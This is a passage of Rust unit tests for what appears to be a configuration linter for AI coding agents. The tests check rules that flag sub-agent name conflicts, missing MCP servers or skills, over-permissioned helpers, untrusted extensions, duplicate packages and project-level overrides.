                r.bindings[0].agent_kind = AgentKind::Codex;
                r
            },
        ];
        let ctx = ctx_with(resources);
        let rule = SubAgentNameConflictRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("reviewer"));
    }

    #[test]
    fn sub_agent_missing_mcp_detected() {
        let resources = vec![sub_agent_with_skills(
            "reviewer",
            "code reviewer",
            vec!["mcp:ghost"],
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = SubAgentMissingMcpRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("ghost"));
    }

    #[test]
    fn sub_agent_missing_skill_detected() {
        let resources = vec![sub_agent_with_skills(
            "reviewer",
            "code reviewer",
            vec![],
            vec!["skill:ghost"],
        )];
        let ctx = ctx_with(resources);
        let rule = SubAgentMissingSkillRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("ghost"));
    }

    #[test]
    fn sub_agent_over_permission_detected() {
        let resources = vec![sub_agent_with_skills(
            "admin-helper",
            "system admin",
            vec![],
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = SubAgentOverPermissionRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("elevated permissions"));
    }

    // -----------------------------------------------------------------
    // Pi helpers and tests
    // -----------------------------------------------------------------

    fn pi_resource(
        name: &str,
        resource_type: &str,
        source_path: Option<&str>,
        trusted: bool,
        extra_payload: serde_json::Value,
        bindings: Vec<ResourceBindingRecord>,
    ) -> ResourceRecord {
        let mut payload = json!({
            "resourceType": resource_type,
            "source": name,
            "trusted": trusted,
        });
        if let Some(obj) = extra_payload.as_object() {
            for (k, v) in obj {
                payload[k] = v.clone();
            }
        }
        ResourceRecord {
            id: format!("pi:{}", name),
            resource_type: ResourceType::PiResource,
            name: name.to_string(),
            slug: Some(name.to_string()),
            agent_kind: Some(AgentKind::Pi),
            source_path: source_path.map(|s| s.to_string()),
            status: "active".into(),
            payload,
            updated_at: "2026-01-01T00:00:00Z".into(),
            bindings,
        }
    }

    #[test]
    fn pi_missing_path_detected() {
        let resources = vec![pi_resource(
            "theme-dark",
            "theme",
            Some("/this/path/should/not/exist/theme"),
            true,
            json!({}),
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = PiMissingPathRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("does not exist"));
    }

    #[test]
    fn pi_duplicate_package_detected() {
        let resources = vec![
            pi_resource("lodash", "package", None, true, json!({}), vec![]),
            pi_resource("lodash", "package", None, true, json!({}), vec![]),
        ];
        let ctx = ctx_with(resources);
        let rule = PiDuplicatePackageRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("lodash"));
    }

    #[test]
    fn pi_untrusted_extension_detected() {
        let resources = vec![pi_resource(
            "ext-one",
            "extension",
            None,
            false,
            json!({}),
            vec![],
        )];
        let ctx = ctx_with(resources);
        let rule = PiUntrustedExtensionRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("not marked as trusted"));
    }

    #[test]
    fn pi_project_override_detected() {
        let resources = vec![
            pi_resource(
                "dark-mode",
                "setting",
                None,
                true,
                json!({}),
                vec![ResourceBindingRecord {
                    id: "bg1".into(),
                    resource_type: ResourceType::PiResource,
                    resource_id: "pi:dark-mode".into(),
                    agent_kind: AgentKind::Pi,
                    project_id: None,
                    project_name: None,
                    scope_type: ScopeType::Global,
                    enabled: true,
                    status: "active".into(),
                    config_path: Some("/global/pi.json".into()),
                    updated_at: "2026-01-01T00:00:00Z".into(),
                }],
            ),
            pi_resource(
                "dark-mode",
                "setting",
                None,
                true,
                json!({}),
                vec![ResourceBindingRecord {
                    id: "bg2".into(),
                    resource_type: ResourceType::PiResource,
                    resource_id: "pi:dark-mode".into(),
                    agent_kind: AgentKind::Pi,
                    project_id: Some("p1".into()),
                    project_name: Some("Project One".into()),
                    scope_type: ScopeType::Project,
                    enabled: true,
                    status: "active".into(),
                    config_path: Some("/project/pi.json".into()),
                    updated_at: "2026-01-01T00:00:00Z".into(),
                }],
            ),
        ];
        let ctx = ctx_with(resources);
        let rule = PiProjectOverrideRule;
        let issues = rule.check(&ctx);
        assert_eq!(issues.len(), 1);
        assert!(issues[0].message.contains("override"));
    }
}
